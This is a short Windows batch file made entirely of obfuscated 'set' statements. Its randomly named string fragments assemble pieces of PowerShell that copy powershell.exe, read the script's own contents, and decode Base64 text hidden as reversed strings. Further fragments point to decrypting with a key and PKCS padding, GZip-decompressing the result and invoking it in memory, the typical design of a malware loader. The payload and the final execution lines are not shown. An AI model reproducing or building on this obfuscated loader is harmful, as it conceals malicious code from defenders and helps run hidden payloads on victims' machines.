@echo off
set "ujDvkZtZMS=:\"
set "gULxbrcdTY=1."
set "nCQGnJsSPE=rS"
set "pMrHXmfynS=\v"
set "EEKsSlMjek=32"
set "TUaEFmwZys=we"
set "bANZtLMQak=ws"
set "jewUsLIzRg=0\"
set "cMzldTXcXr=s\"
set "gCsvxwMmdD=py"
set "hSevwEaMvl=ll"
set "uHIHrTqEnN= C"
set "ahGUECGHKY=nd"
set "aCTrPhzith=ll"
set "zMUMTVXWbD=xe"
set "sMoNVOJRkN=st"
set "UmjtbNWcIe=.e"
set "EhSfdNcVVJ=do"
set "gLYJNmDJRI=Sy"
set "aRtgBnIvQL=em"
set "evovYkpxpm=rs"
set "KMocqmrSZu= /"
set "upfCgqyLqp=\W"
set "zBJGKZNEFD=Wi"
set "CBRXKHcrCE=he"
set "EGGhJVvdhm=he"
set "kCcdssxnfV=y "
set "jfSjqosSiz=in"
set "jkyHpPkkZy=po"
set "BEeKygQwpx=we"
set "PWfBCyMAcE=Po"
set "XLSSwXYWly=ow"
set "jpobSnpfFR=co"
set "NEAOfzokgh= %~dp0"
set "mFokQLQiAw=cd"
set "YlKGLCSiRY=New-"
set "eqQufVEmlE=CFxo"
set "OACevaEziv=am;$"
set "fzHJYpPnpp=..-1"
set "DZuaTHVXQS=;$Zq"
set "XLggcRXUqT=Fg ="
set "aEeOBcJZWf=tem."
set "maNWyriIxu=sion"
set "BdvOoUDSiZ=('%~f0'"
set "FevQIQkEls='txe"
set "BlIrqPoknD=.Com"
set "aoUWRtVbSc=New-"
set "RzVTGRKEJE=L4Yi"
set "wvLoXmtLoM=; };"
set "zXOZWWlDIi=S.Pa"
set "kJFGJfuHMJ=tS46"
set "TOTdnENsCY=1..-"
set "LMZKLpWfQV=ddin"
set "TlVrtJzcPc=rofi"
set "dXbZIPuyaH=se()"
set "CUMnljpjTZ=$fMR"
set "iLFuKlSMUV=le  "
set "PodWFgvTxP= [Sy"
set "SMsLVDHxrB=y]::"
set "VhjVPTGXUs=a.En"
set "RxDwpvkxNg=V = "
set "SXxbfRqzPb=l5E7"
set "vBVMTFZYFs=).Sp"
set "NksTCTwOzi=Syst"
set "zyyNxTYtAH=ZDNQ"
set "xZgCZObYpt=$pIa"
set "jQpkdexsfK=NQN "
set "OKKjQBtmSG=ach "
set "McAHqJDfPE=PxEW"
set "cocKFCNkow=-Obj"
set "fExhUPBAzc=esaB"
set "qsuVYeIxNB=:('g"
set "mGyFGrCEVu=ay()"
set "nsGFvciWWr=1] -"
set "xyDPcbSCjp=yste"
set "TJZUhAtWkL=.Key"
set "NQQLWPOmhh=;$Bf"
set "vwQkpFQJsH=fore"
set "eaKUxOmAgq== $b"
set "AoDvpziUGb=ewLi"
set "ChhvbAwwJX=brea"
set "MJzaPNvxXG=.GZi"
set "QuxsPlponK=ne);"
set "OpcMSEbXUT=ecry"
set "qXcaDfIXef=y.Cr"
set "OnPLeuEMwH=::De"
set "IRCpqaARib=YxVw"
set "KVxwHEyiPt=]::C"
set "Pvfflofwqz=n ''"
set "OirMskQvXn=ode]"
set "iWwsQueKvj=[Env"
set "TPXtyHvQqP=WgzS"
set "YkIdmOdxOK= = $"
set "VXXJkYLUyQ=gjYA"
set "OCSuDNjqAT=morF"
set "dPOwbAqLpE= [st"
set "mhArekIAiQ='[-1"
set "UXOCwysjiM=S46e"
set "jdzdkRWfpd=ateD"
set "xFtuPWxREo=[IO."
set "dziAtNGNjT=t Sy"
set "DKcufjVkMu='gni"
set "ArcuTIVslb=m.IO"
set "eJalZqNlYS=Invo"
set "kZVzspdbWo=BC;$"
set "mRoHacJIUW=comp"
set "KhoTyNWMTK=-4] "
set "BVDEKdmOBw=Disp"
set "FjyqzLdSNN=]::("
set "GGNSRxJqKq=$OTb"
set "tdSGypfEJL=bvu."
set "vNpqsZeuAs=);$p"
set "fZKgjQgviu=Stre"
set "IxKEypGJQY=ss -"
set "pfvzTuaQjq=, $f"
set "srhjXTRxxa=Fg);"
set "cZmjgTnGIq=iron"
set "hmaiNEtlNG=y.Ci"
set "fFDzqbJTjx=HnA."
set "NEpGMdFiko=PKCS"
set "eTtavZdzjQ=Fg.T"
set "GnXnYuSMaf=lBlo"
set "zqcSBUASjE=oryS"
set "tfmstaNgXq=XtfF"
set "eLhMWkQQBz=y.Pa"
set "SWhWzAzJuE=rity"
set "mdziWpepvL=g = "
set "UxfodRWihL=mory"
set "QWHhfgZITk=ment"
set "krNMJlAjex=.Cre"
set "DZxZjYemMp=F'[-"
set "ahrvCejqmE=Obje"
set "csxQHHhwag=);$P"
set "NogaPbcWfG=$fMR"
set "hgDwJePRAl=KxZ."
set "WNDoEHGvnU=:: '"
set "IqQbvytoUN= [Sy"
set "zGemEkSpYK=rtS4"
set "svfWbVuHfP=.Cry"
set "aorjysByzH=k; }"
set "DlaJInmNJr=ct S"
set "nrwidSXDFl=ada "
